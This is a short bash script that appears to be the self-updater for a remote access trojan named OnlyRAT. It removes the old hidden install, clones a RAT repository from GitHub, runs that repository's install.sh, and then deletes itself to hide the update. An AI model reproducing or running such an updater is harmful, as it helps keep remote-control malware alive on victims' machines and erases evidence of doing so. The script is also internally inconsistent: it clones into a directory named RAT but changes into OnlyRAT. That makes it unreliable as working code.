#!/bin/bash
# remove previous version
cd ~
rm -rf .OnlyRAT

# install new version
git clone https://github.com/mridul249/RAT.git

# install dependencies
cd OnlyRAT
chmod +x install.sh
./install.sh

# self delete
rm -rf ../update.sh
